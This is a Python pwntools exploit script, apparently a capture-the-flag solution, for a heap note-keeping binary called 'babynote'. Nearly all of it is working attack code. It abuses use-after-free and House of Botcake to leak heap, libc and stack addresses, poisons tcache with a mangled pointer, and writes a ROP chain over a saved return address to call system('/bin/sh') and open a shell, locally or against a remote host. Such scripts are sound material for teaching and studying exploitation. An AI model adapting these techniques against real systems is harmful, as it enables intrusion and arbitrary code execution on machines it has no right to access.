#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('babynote')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def create_note(idx, size, data):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b"index?", str(idx).encode())
    io.sendlineafter(b"Size?", str(size).encode())
    io.sendafter(b"Data?", data)

def delete_note(idx):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"index?", str(idx).encode())

def view_note(idx):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b"index?", str(idx).encode())

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val


def solve():

    """
    Stage1:
        - House of BotCake: https://4xura.com/pwn/house-of-botcake/ to gain arb read/write
        - Use UAF to leak libc from unsorted bin
        - Use arb read via House of BotCake to leak stack from environ in libc
        
    """

    for i in range(7):
        val = 0x41 + i
        create_note(i, 0x100, bytes([val]) * 8)

    create_note(7, 0x100, b"prev")
    create_note(8, 0x100, b"victim")
    create_note(10, 0x10, b"consolidation")

    for i in range(7):
        delete_note(i)

    delete_note(8)

    view_note(0)
    io.recvuntil(b"> ")
    heap_base = u64(io.recv(5).ljust(8, b"\x00")) << 12
    info("heap base: %#x", heap_base)

    view_note(8)
    io.recvuntil(b"> ")
    main_arena = u64(io.recv(6).ljust(8, b"\x00")) - 0x60
    libc.address = main_arena - libc.sym["main_arena"]
    info("main arena struct: %#x", main_arena)
    info("libc base: %#x", libc.address)

    delete_note(7)
    create_note(9, 0x100, b"\x41")
    delete_note(8)

    ptr = mangle(heap_base, libc.sym["environ"] - 24)
    payload = b"\x41" * 0x108 + p64(0x111) + p64(ptr)
    size = (0x100 * 2) + 0x10
    create_note(11, size, payload)

    create_note(12, 0x100, b"\x41" * 8)
    create_note(13, 0x100, b"\x41" * 24)
    view_note(13)
    io.recvuntil(b"A"*24)
    stack_leak = u64(io.recv(6).ljust(8, b"\x00")) - 8
    info("stack leak: %#x", stack_leak)

    """
    Stage 2:
    - Overlapping chunk to stack (createNote: saved rip)
    - ROP on stack return address
    """

    for i in range(14, 21):
        create_note(i, 0x90, b"\x90")

    create_note(21, 0x90, b"prev")
    create_note(22, 0x90, b"victim")
    create_note(23, 0x10, b"consolidation")

    for i in range(14, 21):
        delete_note(i)

    delete_note(22)
    delete_note(21)
    create_note(24, 0x90, b"\x41")
    delete_note(22)

    saved_rip = stack_leak - 0x158
    info("createNote() -> saved rip: %#x", saved_rip)
    ptr = mangle(heap_base, saved_rip + 7 - 8)
    payload = b"\x41" * 0x98 + p64(0xa1) + p64(ptr)
    size = (0x90 * 2) + 0x10
    create_note(25, size, payload)

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    sh = next(libc.search(b"/bin/sh\x00"))
    ret = rop.find_gadget(["ret"])[0]
    system = libc.sym["system"]

    ropchain = flat(
        [   
            b"\x41" * 8,
            pop_rdi,
            sh,
            ret,
            system
        ]
    )
    
    create_note(26, 0x90, b"\x41" * 8)
    create_note(27, 0x90, ropchain)


    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

